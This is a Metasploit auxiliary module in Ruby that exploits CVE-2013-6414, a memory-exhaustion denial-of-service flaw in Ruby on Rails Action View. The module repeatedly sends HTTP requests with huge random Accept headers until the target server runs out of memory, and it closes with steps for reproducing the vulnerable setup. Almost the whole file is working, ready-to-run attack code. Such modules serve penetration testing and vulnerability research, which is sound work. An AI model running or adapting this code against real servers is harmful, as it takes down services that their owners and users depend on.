##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ruby on Rails Action View MIME Memory Exhaustion',
        'Description' => %q{
          This module exploits a Denial of Service (DoS) condition in Action View that requires
          a controller action. By sending a specially crafted content-type header to a Rails
          application, it is possible for it to store the invalid MIME type, and may eventually
          consume all memory if enough invalid MIMEs are given.

          Versions 3.0.0 and other later versions are affected, fixed in 4.0.2 and 3.2.16.
        },
        'Author' => [
          'Toby Hsieh', # Reported the issue
          'joev',       # Metasploit
          'sinn3r'      # Metasploit
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2013-6414' ],
          [ 'OSVDB', '100525' ],
          [ 'BID', '64074' ],
          [ 'URL', 'https://seclists.org/oss-sec/2013/q4/400' ],
          [ 'URL', 'https://github.com/rails/rails/commit/bee3b7f9371d1e2ddcfe6eaff5dcb26c0a248068' ]
        ],
        'DisclosureDate' => '2013-12-04',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('URIPATH', [true, 'The URI that routes to a Rails controller action', '/']),
        OptInt.new('MAXSTRINGSIZE', [true, 'Max string size', 60_000]),
        OptInt.new('REQCOUNT', [true, 'Number of HTTP requests to pipeline per connection', 1]),
        OptInt.new('RLIMIT', [true, 'Number of requests to send', 100_000])
      ]
    )
  end

  def host
    host = datastore['RHOST']
    host += ':' + datastore['RPORT'].to_s if datastore['RPORT'] != 80
    host
  end

  def long_string
    Rex::Text.rand_text_alphanumeric(datastore['MAXSTRINGSIZE'])
  end

  #
  # Returns a modified version of the URI that:
  # 1. Always has a starting slash
  # 2. Removes all the double slashes
  #
  def normalize_uri(*strs)
    new_str = strs * '/'

    new_str = new_str.gsub!('//', '/') while new_str.index('//')

    # Makes sure there's a starting slash
    unless new_str.start_with?('/')
      new_str = '/' + new_str
    end

    new_str
  end

  def http_request
    uri = normalize_uri(datastore['URIPATH'])

    http = ''
    http << "GET #{uri} HTTP/1.1\r\n"
    http << "Host: #{host}\r\n"
    http << "Accept: #{long_string}\r\n"
    http << "\r\n"

    http
  end

  def run
    print_status('Stressing the target memory, this will take quite some time...')
    datastore['RLIMIT'].times do |_i|
      connect
      datastore['REQCOUNT'].times { sock.put(http_request) }
      disconnect
    end

    print_status("Attack finished. Either the server isn't vulnerable, or please dos harder.")
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    print_status("Unable to connect to #{host}.")
  rescue ::Errno::ECONNRESET, ::Errno::EPIPE, ::Timeout::Error
    print_good("DoS successful. #{host} not responding. Out Of Memory condition probably reached.")
  ensure
    disconnect
  end
end

=begin

Reproduce:

1. Add a def index; end to ApplicationController
2. Add an empty index.html.erb file to app/views/application/index.html.erb
3. Uncomment the last line in routes.rb
4. Hit /application

=end
